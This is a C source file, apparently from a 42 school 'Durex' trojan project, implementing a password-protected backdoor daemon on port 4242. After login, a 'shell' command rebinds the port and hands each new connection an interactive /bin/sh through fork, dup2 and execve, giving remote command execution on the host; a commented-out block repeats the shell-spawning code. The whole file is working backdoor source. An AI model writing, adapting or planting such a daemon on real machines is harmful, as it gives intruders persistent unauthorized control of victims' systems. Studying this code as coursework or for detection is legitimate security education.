/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   durex_daemon.c                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: user42 <user42@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2022/02/09 12:00:08 by user42            #+#    #+#             */
/*   Updated: 2022/02/12 15:20:46 by user42           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

int		get_id(int fd, t_server *server)
{
	t_client	*tmp = server->clients;

	if (tmp == 0)
		return (-1);
	while (tmp)
	{
		if (tmp->fd == fd)
			return (tmp->id);
		tmp = tmp->next;
	}
	return (-1);
}

t_client	*get_client_from_id(t_server *server, int id)
{
	t_client	*tmp = server->clients;

	if (tmp == 0)
		return (0);
	while (tmp)
	{
		if (tmp->id == id)
			return (tmp);
		tmp = tmp->next;
	}
	return (0);
}

t_client	*get_client_from_fd(t_server *server, int fd)
{
	t_client	*tmp = server->clients;

	if (tmp == 0)
		return (0);
	while (tmp)
	{
		if (tmp->fd == fd)
			return (tmp);
		tmp = tmp->next;
	}
	return (0);
}

void	fatal(t_server *server)
{
	printf("[X] Server fatal error.\n");
	close(server->listen_sd);
	exit(1);
}

void	send_info(t_server *server, int sd, char *info)
{
	if ((send(sd, info, strlen(info), 0)) < 0)
		fatal(server);
}

void	setup_server(t_server *server)
{
	struct sockaddr_in		sockaddr;

	server->last_id = 0;
	server->clients = 0;
	server->client_nb = 0;

	if ((server->listen_sd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		fatal(server);
	int enable = 1;
	setsockopt(server->listen_sd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int));
	
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(4242);
	sockaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	if (bind(server->listen_sd, (struct sockaddr *)&sockaddr, sizeof(sockaddr)) < 0)
		fatal(server);
	if (listen(server->listen_sd, 50) < 0)
		fatal(server);
	
	FD_ZERO(&(server->master_set));
	FD_SET(server->listen_sd, &(server->master_set));
	server->max_sd = server->listen_sd;
}

int		rm_client(int fd, t_server *server)
{
	int			id = (get_id(fd, server));
	t_client	*tmp = server->clients;
	t_client	*del;

	server->client_nb--;
	if (!tmp)
		return (-1);
	if (tmp->fd == fd)
	{
		server->clients = tmp->next;
		free(tmp);
	}
	else
	{
		while (tmp && tmp->next && tmp->next->fd != fd)
			tmp = tmp->next;
		del = tmp->next;
		tmp->next = tmp->next->next;
		free(del);
	}
	return (id);
}

void	shutdown_connection(t_server *server, int i)
{
	printf("[LOG] Client %i just left.\n", rm_client(i, server));
	FD_CLR(i, &(server->master_set));
	close(i);
	while (!FD_ISSET(server->max_sd, &(server->master_set)))
		server->max_sd--;
}

int		add_client_to_list(t_server *server, int new_sd, struct sockaddr_in sockaddr)
{
	t_client	*tmp = server->clients;
	t_client	*new;

	if (!(new = malloc(1 * sizeof(t_client))))
		fatal(server);
	new->fd = new_sd;
	new->id = server->last_id++;
	new->auth = 0;
	new->next = 0;
	new->sockaddr = sockaddr;

	if (!tmp)
		server->clients = new;
	else
	{
		while (tmp->next)
			tmp = tmp->next;
		tmp->next = new;
	}
	return (new->id);
}

void	authenticate(t_server *server, t_client *client)
{
	if (strcmp(crypt(server->buff, SALT), HASHED_PASSWD) != 0)
		send_info(server, client->fd, "[!] Invalid password.\nPassword: ");
	else
	{
		client->auth = 1;
		send_info(server, client->fd, "Authentication successfull. Type '?' to see list of commands.\n");
		send_info(server, client->fd, "$> ");
	}
}

void	reject_client(t_server *server, int fd)
{
	send_info(server, fd, "[!] There is already 3 clients connected on daemon.\n");
	close(fd);
}

void	add_client(t_server *server)
{
	struct sockaddr_in		sockaddr;
	socklen_t				len = sizeof(sockaddr);
	int						new_sd;

	if ((new_sd = accept(server->listen_sd, (struct sockaddr *)&sockaddr, &len)) < 0)
		fatal(server);
	if (server->client_nb >= 3)
		return (reject_client(server, new_sd));
	if (new_sd > server->max_sd)
		server->max_sd = new_sd;
	printf("[LOG] Client %i just arrived.\n", add_client_to_list(server, new_sd, sockaddr));
	FD_SET(new_sd, &(server->master_set));
	send_info(server, new_sd, "		==== DUREX v1.0 ====\nPassword: ");
	server->client_nb++;
}

void	kick_everyone(t_server *server)
{
	t_client	*tmp = server->clients;

	// Closing all fds
	if (tmp == 0)
		return ;
	while (tmp)
	{
		for (int i = 0; i <= server->max_sd; i++)
		{
			if (tmp->fd == i)
				close(tmp->fd);
		}
		tmp = tmp->next;
	}
	
	// Resetting values
	server->client_nb = 0;
	server->max_sd = 0;
	server->last_id = 0;
	FD_ZERO(&(server->master_set));

	printf("[LOG] Kicking everyone from server.\n");

	// Shutting down server
	close(server->listen_sd);
}

void	spawn_shell(t_server *server)
{
	kick_everyone(server);

	struct sockaddr_in	sockaddr;
	char				*const args[] = {"/bin/sh", 0};
	int					enable = 1;

	if ((server->listen_sd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		fatal(server);
	setsockopt(server->listen_sd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int));
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(4242);
	sockaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	if (bind(server->listen_sd, (struct sockaddr *)&sockaddr, sizeof(sockaddr)) < 0)
		fatal(server);
	if (listen(server->listen_sd, 2) < 0)
		fatal(server);
	
	FD_SET(server->listen_sd, &(server->master_set));
	server->max_sd = server->listen_sd;


	while (1)
	{
		server->read_set = server->write_set = server->master_set;
		// Check the status of all child process (corresponding to shells opened by clients.)
		// If there is no shell left, resume durex_daemon()
		if (select(server->max_sd + 1, &(server->read_set), &(server->write_set), 0, 0) < 0)
			continue ;
		for (int i = 0; i <= server->max_sd; i++)
		{
			if (FD_ISSET(i, &(server->read_set)))
			{
				if (i == server->listen_sd)
				{
					int new_sd = accept(server->listen_sd, NULL, NULL);
					if (new_sd > server->max_sd)
						server->max_sd = new_sd;
					pid_t pid = fork();
					if (pid == 0)
					{
						dup2(new_sd, 0);
						dup2(new_sd, 1);
						dup2(new_sd, 2);
						execve("/bin/sh", args, NULL);
					}
					// Parent : add pid to the client.
					// Continue looping.
					break ;
				}
			}
		}
	}
}

void	durex_daemon(void)
{
	t_server	server;
	t_client	*tmp;
	int			rc;

	setup_server(&server);

	while (1)
	{
		server.read_set = server.write_set = server.master_set;
		if (select(server.max_sd + 1, &(server.read_set), &(server.write_set), 0, 0) < 0)
			continue ;
		
		for (int i = 0; i <= server.max_sd; i++)
		{
			if (FD_ISSET(i, &(server.read_set)))
			{
				if (i == server.listen_sd)
				{
					add_client(&server);
					break ;
				}

				else
				{
					rc = recv(i, server.buff, RECV_SIZE - 1, 0);
					if (rc <= 0)
					{
						shutdown_connection(&server, i);
						break ;
					}
					else
					{
						server.buff[rc] = '\0';
						server.buff[strcspn(server.buff, "\n")] = '\0';
						tmp = get_client_from_fd(&server, i);
						
						if (!tmp->auth)
							authenticate(&server, tmp);
						else
						{
							if (!strcmp(server.buff, "?"))
								send_info(&server, i, "?		show this help\nshell [port]	Spawn reverse shell on specified port (default 4444)\nexit		Close connection\n$> ");
							else if (!strcmp(server.buff, "shell"))
								spawn_shell(&server);
							else if (!strcmp(server.buff, "exit"))
							{
								send_info(&server, i, "Bye!");
								shutdown_connection(&server, i);
								break ;
							}
							else
								send_info(&server, i, "$> ");
						}
					}
				}
			}
		}
	}
}







/*


	pid = fork();
	if (pid == 0)
	{
		

		dup2(client_sock, 0);
		dup2(client_sock, 1);
		dup2(client_sock, 2);

		execve("/bin/sh", args, NULL);
		close(server->listen_sd);
	}
	else
	{
		waitpid(pid, &status, 0);
		durex_daemon();
	}


*/
